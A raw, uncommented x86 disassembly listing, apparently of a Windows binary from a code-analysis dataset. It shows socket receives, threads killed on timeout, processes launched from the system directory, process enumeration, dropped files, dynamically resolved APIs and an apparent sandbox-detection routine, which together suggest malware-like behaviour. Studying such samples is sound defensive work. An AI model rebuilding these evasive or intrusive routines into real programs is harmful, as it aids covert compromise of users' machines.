jmp r-xdata
push edi
push 0x0
push esi
call sub_2007940
movzx edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
add esp 0xc
push edi
push [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
lea eax [ esi + 0x110 ]
mov [ esi ] 0x1
call sub_200e539
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
jne r-xdata
push ecx
push ecx
push 0x3
push ecx
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
jmp r-xdata
pop edi
pop esi
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0xc ]
lea edx [ esi + 0xc ]
sub edx eax
push esi
call sub_20016b0
pop ecx
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov [ esi + 0x10c ] edi
mov eax esi
sub_200e96f
cmp [ rw-data ] 0x1
push ebx
push ebp
mov ebp [ esp + 0xc ]
jne r-xdata
push esi
push edi
mov edi 0x404
push edi
call sub_200178d
mov esi eax
xor ebx ebx
pop ecx
cmp esi ebx
je r-xdata
push r--data
call sub_200e635
xor ebx ebx
pop ecx
cmp eax ebx
jne r-xdata
xor eax eax
cmp [ rw-data ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebp
call eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
push r--data
call sub_200e5cf
pop ecx
mov [ rw-data ] eax
pop ebp
pop ebx
retn 0x4
cmp [ rw-data ] ebx
jne r-xdata
push r--data
call sub_200e5cf
pop ecx
mov [ rw-data ] eax
cmp [ rw-data ] ebx
jne r-xdata
push r--data
call sub_200e5cf
pop ecx
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax ebx
jne r-xdata
push r--data
call sub_200e5cf
pop ecx
mov [ rw-data ] eax
cmp [ rw-data ] ebx
je r-xdata
push r--data
call sub_200e5cf
pop ecx
mov [ rw-data ] eax
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp eax ebx
je r-xdata
push edi
push ebx
push esi
call sub_2007940
lea ecx [ esi + 0x4 ]
add esp 0xc
mov [ esi ] ebx
mov eax ebp
sub ecx ebp
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
cmp dl bl
jne r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
sub_200ea84
push ebp
mov ebp esp
sub esp 0x110
cmp [ rw-data ] 0x1
push ebx
push esi
push edi
mov edi eax
jne r-xdata
cmp [ edi + 0x428 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp + 0xc ]
push eax
mov [ ebp - 0x10 ] edi
xor edi edi
push edi
lea eax [ ebp - 0x10 ]
push eax
push sub_200e6dc
push edi
push edi
mov [ rw-data ] edi
call [ CreateThread@IAT ]
mov esi eax
push 0x493e0
push esi
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov eax [ edi + 0x42c ]
xor esi esi
cmp eax esi
jle r-xdata
lea ebx [ edi + 0x42c ]
mov eax [ ebx ]
test eax eax
jge r-xdata
mov eax [ rw-data ]
jmp r-xdata
push edi
push esi
call [ TerminateThread@IAT ]
jge r-xdata
cmp eax [ ebp + 0xc ]
push esi
jle r-xdata
jle r-xdata
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x110 ]
push 0x100
call sub_200e4ca
push ebx
mov eax esi
push r--data
push eax
call sub_2002bbe
mov eax [ ebx ]
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ ebp + 0x10 ]
mov [ eax ] esi
mov eax [ edi + 0x4 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ eax + 0x8 ]
call [ recv@IAT ]
cmp eax esi
jle r-xdata
push eax
push [ ebp + 0xc ]
jmp r-xdata
xor eax eax
jmp r-xdata
cmp eax [ ebp + 0xc ]
push 0x0
jle r-xdata
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
push 0x100
call sub_200e4ca
pop ecx
pop ecx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
sub [ edi + 0x42c ] eax
jmp r-xdata
push [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
call [ recv@IAT ]
cmp eax esi
jl r-xdata
push eax
push [ ebp + 0xc ]
jmp r-xdata
xor eax eax
inc eax
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
sub [ ebx ] eax
jne r-xdata
push [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
call [ recv@IAT ]
test eax eax
jl r-xdata
mov eax [ edi + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x110 ]
push 0x100
call sub_200e4ca
or [ ebx ] 0xffffffff
pop ecx
pop ecx
jmp r-xdata
sub_200ec15
push ebp
lea ebp [ esp - 0x78 ]
mov eax 0x165c
call sub_200d790
push esi
push edi
xor edi edi
inc edi
xor esi esi
cmp [ rw-data ] edi
jne r-xdata
push 0x13ff
lea eax [ ebp - 0x15e3 ]
push esi
push eax
mov [ ebp - 0x15e4 ] 0x0
call sub_2007940
push 0x103
lea eax [ ebp - 0x163 ]
push esi
push eax
mov [ ebp - 0x164 ] 0x0
call sub_2007940
push 0x7f
lea eax [ ebp - 0x5f ]
push esi
push eax
mov [ ebp + 0x74 ] edi
mov [ ebp - 0x60 ] 0x0
call sub_2007940
push 0x3f
lea eax [ ebp + 0x21 ]
push esi
push eax
mov [ ebp + 0x20 ] 0x0
call sub_2007940
push 0x3f
lea eax [ ebp - 0x1a3 ]
push esi
push eax
mov [ ebp - 0x1a4 ] 0x0
call sub_2007940
push 0x3f
lea eax [ ebp - 0x1e3 ]
push esi
push eax
mov [ ebp - 0x1e4 ] 0x0
call sub_2007940
add esp 0x48
lea eax [ ebp + 0x20 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x60 ]
push r--data
push eax
call sub_2010397
add esp 0x10
xor eax eax
or [ ebp + 0x68 ] 0xffffffff
lea eax [ ebp + 0x74 ]
push eax
push esi
lea eax [ ebp + 0x60 ]
push eax
push sub_200e74f
push esi
push esi
mov [ ebp + 0x74 ] esi
mov [ ebp + 0x60 ] ebx
mov [ ebp + 0x64 ] esi
mov [ ebp + 0x6c ] esi
mov [ ebp + 0x70 ] esi
mov [ rw-data ] esi
call [ CreateThread@IAT ]
mov edi eax
push 0x493e0
push edi
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
mov cl [ ebp + eax + 0x20 ]
mov [ ebp + eax - 0x164 ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x164 ]
dec edi
mov eax [ rw-data ]
jmp r-xdata
push esi
push edi
call [ TerminateThread@IAT ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp + 0x20 ]
movsw [ edi ] [ esi ]
mov edx eax
pop edi
pop esi
add ebp 0x78
leave
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x164 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebp - 0x164 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea eax [ ebp + 0x20 ]
movsw [ edi ] [ esi ]
mov edx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x164 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebp - 0x164 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
lea ecx [ ebx + 0x28 ]
push ecx
lea eax [ ebx + 0x8 ]
push eax
mov esi r--data
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x164 ]
push eax
mov eax [ ebx + 0x4 ]
movsb [ edi ] [ esi ]
push [ eax + 0x8 ]
call sub_200e496
lea eax [ ebp - 0x60 ]
push r--data
push eax
call sub_2010397
add esp 0x1c
xor eax eax
mov cl [ ebp + eax + 0x20 ]
mov [ ebp + eax - 0x164 ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x164 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov esi r--data
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x164 ]
push eax
mov eax [ ebx + 0x4 ]
movsb [ edi ] [ esi ]
push [ eax + 0x8 ]
call sub_200e496
lea eax [ ebp - 0x60 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x164 ]
push eax
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
call sub_200e496
lea eax [ ebp - 0x60 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x164 ]
push eax
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
call sub_200e496
lea eax [ ebp - 0x60 ]
push r--data
push eax
call sub_2010397
add esp 0x3c
xor eax eax
mov cl [ ebp + eax + 0x20 ]
mov [ ebp + eax - 0x164 ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ ebp + 0x20 ]
mov edx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x164 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebp - 0x164 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov eax [ ebx + 0x4 ]
mov esi r--data
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov ecx [ eax + 0x4 ]
add ecx 0x4
push ecx
lea ecx [ ebp - 0x60 ]
push ecx
lea ecx [ ebp - 0x164 ]
push ecx
push [ eax + 0x8 ]
call sub_200e496
lea eax [ ebp - 0x60 ]
push r--data
push eax
call sub_2010397
mov eax [ ebx + 0x4 ]
lea ecx [ eax + 0xc ]
push ecx
lea ecx [ ebp - 0x60 ]
push ecx
lea ecx [ ebp - 0x164 ]
push ecx
push [ eax + 0x8 ]
call sub_200e496
lea eax [ ebp - 0x60 ]
push r--data
push eax
call sub_2010397
add esp 0x30
xor eax eax
mov cl [ ebp + eax + 0x20 ]
mov [ ebp + eax - 0x164 ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ ebp - 0x164 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov esi r--data
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x164 ]
push eax
mov eax [ ebx + 0x4 ]
movsb [ edi ] [ esi ]
push [ eax + 0x8 ]
call sub_200e496
lea eax [ ebp - 0x164 ]
push r--data
push eax
call sub_2010397
lea edi [ ebp - 0x164 ]
add esp 0x14
dec edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x164 ]
push eax
mov eax [ ebx + 0x4 ]
movsb [ edi ] [ esi ]
push [ eax + 0x8 ]
call sub_200e496
mov eax [ ebx + 0x1430 ]
pop ecx
pop ecx
test eax eax
jle r-xdata
mov eax [ ebx + 0x4 ]
push r--data
push [ eax + 0x8 ]
call sub_200e496
lea eax [ ebp - 0x60 ]
push r--data
push eax
call sub_2010397
add esp 0x10
lea eax [ ebp - 0x60 ]
lea esi [ ebx + 0x8 ]
push 0x0
push eax
lea eax [ ebx + 0x430 ]
push eax
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
call [ rw-data ]
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ ebp + 0x74 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x15e4 ]
push 0x400
call sub_200e4ca
pop ecx
pop ecx
test eax eax
jne r-xdata
test eax eax
je r-xdata
inc esi
inc esi
inc eax
inc eax
test cl cl
jne r-xdata
push 0x3
mov edi r--data
lea esi [ ebp - 0x15e4 ]
pop ecx
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov [ ebx + 0x1434 ] 0x1
jmp r-xdata
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ ebp - 0x15e4 ]
push r--data
push eax
call sub_2001a34
push r--data
xor esi esi
push esi
call sub_2001a34
add esp 0x10
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push eax
call sub_20018fc
pop ecx
cmp eax 0xc8
je r-xdata
mov [ ebx + 0x1434 ] 0x1
jmp r-xdata
lea eax [ ebp + 0x20 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x1e4 ]
push r--data
push eax
call sub_2010397
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x15e4 ]
push 0x400
call sub_200e4ca
add esp 0x20
jmp r-xdata
mov [ ebp + 0x74 ] esi
test eax eax
jne r-xdata
push 0x3
mov edi r--data
lea esi [ ebp - 0x15e4 ]
pop ecx
xor eax eax
[ esi ] [ edi ]
je r-xdata
push 0xe
lea eax [ ebp + 0x20 ]
push eax
lea eax [ ebp - 0x15e4 ]
push eax
call sub_2002a5e
add esp 0xc
test eax eax
jne r-xdata
push 0x1a
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x15e4 ]
push eax
call sub_2002a5e
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x15d5 ]
push eax
call sub_20018e6
pop ecx
mov [ ebx + 0x42c ] eax
jmp r-xdata
push 0x11
lea eax [ ebp - 0x1e4 ]
push eax
lea eax [ ebp - 0x15e4 ]
push eax
call sub_2002a5e
add esp 0xc
test eax eax
jne r-xdata
mov [ ebx + 0x428 ] 0x1
jmp r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
lea esi [ ebp - 0x15e4 ]
push 0x400
call sub_200e4ca
pop ecx
pop ecx
mov [ ebx + 0x1434 ] 0x1
sub_200f1d4
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x4a0
push esi
push 0x4f
lea eax [ ebp - 0x27 ]
push 0x0
push eax
mov [ ebp - 0x28 ] 0x0
call sub_2007940
push 0x4f
lea eax [ ebp + 0x29 ]
push 0x0
push eax
mov [ ebp + 0x28 ] 0x0
call sub_2007940
add esp 0x18
xor esi esi
call sub_2001e9f
cdq
push 0x19
pop ecx
idiv ecx
add dl 0x41
mov [ ebp + esi - 0x28 ] dl
call sub_2001e9f
push 0x19
cdq
pop ecx
idiv ecx
add dl 0x41
mov [ ebp + esi + 0x28 ] dl
inc esi
cmp esi 0x4f
jb r-xdata
lea eax [ ebp + 0x28 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ SetEnvironmentVariableA@IAT ]
push 0x400
lea eax [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ GetEnvironmentVariableA@IAT ]
lea eax [ ebp + 0x28 ]
push eax
lea eax [ ebp - 0x428 ]
push eax
call [ lstrcmpA@IAT ]
neg eax
sbb eax eax
neg eax
pop esi
add ebp 0x78
leave
retn
sub_200f272
push ebp
mov ebp esp
sub esp 0x164
push ebx
push esi
push edi
push 0x44
pop esi
push esi
xor ebx ebx
lea eax [ ebp - 0x58 ]
push ebx
push eax
call sub_2007940
add esp 0xc
push 0x5
pop eax
mov [ ebp - 0x28 ] ax
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
push 0x104
lea eax [ ebp - 0x160 ]
push eax
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x2c ] 0x1
call [ GetSystemDirectoryA@IAT ]
mov edi [ lstrlenA@IAT ]
lea eax [ ebp - 0x160 ]
lea esi [ ebp - 0x160 ]
push eax
dec esi
call edi
cmp [ eax + esi ] 0x5c
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x160 ]
push eax
call [ CreateProcessA@IAT ]
call [ GetLastError@IAT ]
sub eax 0x5
neg eax
pop edi
sbb eax eax
pop esi
inc eax
pop ebx
leave
retn
lea eax [ ebp - 0x160 ]
push eax
call edi
mov [ eax + esi ] bl
sub_200f323
push ebp
mov ebp esp
sub esp 0x554
push ebx
push esi
push edi
mov esi 0x103
xor ebx ebx
push esi
lea eax [ ebp - 0x217 ]
push ebx
push eax
mov [ ebp - 0x218 ] bl
call sub_2007940
push esi
lea eax [ ebp - 0x54f ]
push ebx
push eax
mov [ ebp - 0x550 ] bl
call sub_2007940
add esp 0x18
inc esi
push esi
lea eax [ ebp - 0x218 ]
push eax
push ebx
mov [ ebp - 0x4 ] ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x218 ]
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
je r-xdata
xor eax eax
lea eax [ ebp - 0x218 ]
push 0x5c
push eax
call sub_2002110
pop ecx
inc eax
lea edx [ ebp - 0x550 ]
pop ecx
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
push esi
lea eax [ ebp - 0x31f ]
push ebx
push eax
mov [ ebp - 0x320 ] bl
call sub_2007940
push esi
lea eax [ ebp - 0x10f ]
push ebx
push eax
mov [ ebp - 0x110 ] bl
call sub_2007940
lea eax [ ebp - 0x320 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_2010397
mov esi [ GetModuleHandleA@IAT ]
add esp 0x28
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x320 ]
push eax
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x110 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x320 ]
push eax
call esi
push eax
call edi
mov edi eax
cmp edi ebx
je r-xdata
push ebx
push 0x2
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov ax [ ebp - 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x448 ]
push eax
mov esi 0x128
push ebx
mov [ ebp - 0x448 ] esi
call [ ebp - 0x8 ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax eax
jne r-xdata
lea eax [ ebp - 0x550 ]
push eax
lea eax [ ebp - 0x424 ]
push eax
call sub_20015e1
pop ecx
pop ecx
test eax eax
jne r-xdata
push ebx
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x448 ]
push eax
push ebx
mov [ ebp - 0x448 ] esi
call edi
inc [ ebp - 0x4 ]
sub_200f4bd
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x113 ]
push ebx
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x114 ] bl
call sub_2007940
mov esi 0x16fb9
push esi
call sub_200178d
add esp 0x10
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
push edi
mov edi 0x89e56
push edi
call sub_200178d
pop ecx
mov [ ebp - 0x10 ] eax
cmp eax ebx
jne r-xdata
xor eax eax
jmp r-xdata
push esi
push rw-data
push [ ebp - 0x4 ]
call sub_2010325
push edi
push ebx
push [ ebp - 0x10 ]
call sub_2007940
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edi
mov edi [ ebp - 0x10 ]
push edi
lea esi [ ebp - 0x8 ]
call sub_2001000
add esp 0x24
push [ ebp - 0x4 ]
test eax eax
jge r-xdata
push [ ebp - 0x4 ]
jmp r-xdata
pop esi
pop ebx
leave
retn
call sub_20016b0
pop ecx
push ebx
push ebx
push 0x2
push ebx
push ebx
push 0xc0000000
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
call sub_20016b0
push edi
call sub_20016b0
pop ecx
jmp r-xdata
call sub_20016b0
push ebx
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x8 ]
push edi
push esi
call [ WriteFile@IAT ]
push edi
test eax eax
jne r-xdata
push edi
pop ecx
jmp r-xdata
xor eax eax
call sub_20016b0
pop ecx
push esi
call [ CloseHandle@IAT ]
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x114 ]
sub eax esi
call sub_20016b0
pop ecx
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
mov cl [ esi ]
mov [ eax + esi ] cl
inc esi
cmp cl bl
jne r-xdata
lea edi [ ebp - 0x114 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0xc0000000
lea eax [ ebp - 0x114 ]
mov esi r--data
push eax
movsw [ edi ] [ esi ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push ebx
lea eax [ ebp - 0xc ]
push eax
push 0x778
push rw-data
push esi
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
xor ebx ebx
inc ebx
jmp r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax ebx
jmp r-xdata
pop edi
sub_200f637
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0x84
push ebx
xor ebx ebx
push 0x3f
lea eax [ ebp - 0xb ]
push ebx
push eax
mov [ ebp + 0x74 ] ebx
mov [ ebp - 0xc ] bl
call sub_2007940
push 0x3f
lea eax [ ebp + 0x35 ]
push ebx
push eax
mov [ ebp + 0x34 ] bl
call sub_2007940
lea eax [ ebp - 0xc ]
push r--data
push eax
call sub_2010397
lea eax [ ebp + 0x34 ]
push r--data
push eax
call sub_2010397
add esp 0x28
lea eax [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
mov [ rw-data ] eax
pop ebx
je r-xdata
mov eax [ ebp + 0x74 ]
add ebp 0x78
leave
retn
lea eax [ ebp + 0x74 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
sub_200f6bd
push ebp
mov ebp esp
sub esp 0x80
push ebx
xor ebx ebx
push 0x3f
lea eax [ ebp - 0x7f ]
push ebx
push eax
mov [ ebp - 0x80 ] bl
call sub_2007940
push 0x3f
lea eax [ ebp - 0x3f ]
push ebx
push eax
mov [ ebp - 0x40 ] bl
call sub_2007940
lea eax [ ebp - 0x80 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x40 ]
push r--data
push eax
call sub_2010397
add esp 0x28
push ebx
push esi
push ebx
push ebx
push 0xa
push 0xa
mov eax 0xfffffe0c
push eax
push eax
push 0xcf0000
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
push 0x80
mov [ rw-data ] esi
call [ CreateWindowExA@IAT ]
cmp eax ebx
mov [ rw-data ] eax
pop ebx
jne r-xdata
push [ ebp + 0x8 ]
push eax
call [ ShowWindow@IAT ]
push [ rw-data ]
call [ UpdateWindow@IAT ]
xor eax eax
inc eax
leave
retn
xor eax eax
leave
retn
sub_200f75c
push ebp
mov ebp esp
sub esp 0x140
push ebx
xor ebx ebx
push 0x103
lea eax [ ebp - 0x13b ]
push ebx
push eax
mov [ ebp - 0x13c ] bl
call sub_2007940
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x13c ]
push r--data
push eax
mov [ ebp - 0x34 ] 0x30
mov [ ebp - 0x30 ] 0x3
mov [ ebp - 0x2c ] DefWindowProcA
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x6
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ebx
call sub_2010397
lea eax [ ebp - 0x13c ]
mov [ ebp - 0xc ] eax
add esp 0x14
lea eax [ ebp - 0x34 ]
push eax
call [ RegisterClassExA@IAT ]
pop ebx
leave
retn
sub_200f7de
push ebp
mov ebp esp
sub esp 0x210
push ebx
push esi
mov esi 0x104
xor ebx ebx
push esi
lea eax [ ebp - 0x20f ]
push ebx
push eax
mov [ ebp - 0x210 ] bl
call sub_2007940
push esi
lea eax [ ebp - 0x107 ]
push ebx
push eax
mov [ ebp - 0x108 ] bl
call sub_2007940
lea eax [ ebp - 0x210 ]
push r--data
push eax
call sub_2010397
add esp 0x20
lea eax [ ebp - 0x210 ]
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
pop esi
or eax 0xffffffff
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x108 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
lea eax [ ebp - 0x108 ]
push eax
push esi
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
lea eax [ ebp - 0x108 ]
push r--data
push eax
call sub_2010397
pop ecx
pop ecx
push 0x5
call [ Sleep@IAT ]
jmp r-xdata
push eax
call [ SetForegroundWindow@IAT ]
push ebx
push ebx
push ebx
push 0x1b
call esi
push ebx
push 0x2
push ebx
push 0x1b
call esi
lea eax [ ebp - 0x108 ]
push eax
push ebx
call [ FindWindowA@IAT ]
cmp eax ebx
je r-xdata
sub_200f8b4
push ebp
mov ebp esp
sub esp 0x51c
push ebx
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x207 ]
push ebx
push eax
mov [ ebp - 0x208 ] bl
call sub_2007940
push 0x3f
lea eax [ ebp - 0x57 ]
push ebx
push eax
mov [ ebp - 0x58 ] bl
call sub_2007940
push 0x3f
lea eax [ ebp - 0x97 ]
push ebx
push eax
mov [ ebp - 0x98 ] bl
call sub_2007940
add esp 0x24
push 0x104
lea eax [ ebp - 0x518 ]
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
xor eax eax
mov cl [ ebp + eax - 0x518 ]
mov [ ebp + eax - 0x410 ] cl
inc eax
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x410 ]
push 0x5c
push eax
call sub_2002110
mov [ eax ] bl
lea eax [ ebp - 0x208 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x208 ]
add esp 0x10
mov edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0x410 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebp - 0x58 ]
and ecx 0x3
push r--data
push eax
[ edi ] [ esi ]
call sub_2010397
lea eax [ ebp - 0x98 ]
push r--data
push eax
call sub_2010397
add esp 0x10
lea eax [ ebp - 0x98 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x100 ]
push r--data
push eax
call sub_2010397
lea eax [ ebp - 0x410 ]
push eax
call sub_200f4bd
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x44
pop esi
push esi
lea eax [ ebp - 0xe0 ]
push ebx
push eax
call sub_2007940
xor eax eax
lea edi [ ebp - 0x14 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea edi [ ebp - 0x410 ]
add esp 0xc
mov [ ebp - 0xe0 ] esi
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov esi r--data
lea eax [ ebp - 0x518 ]
movsw [ edi ] [ esi ]
mov edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ ebp - 0x410 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xe0 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x410 ]
push eax
and ecx 0x3
push ebx
[ edi ] [ esi ]
call [ ebp - 0x4 ]
sub_200fa6c
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xf14
push ebx
push esi
push edi
push 0xa
xor eax eax
xor ebx ebx
pop ecx
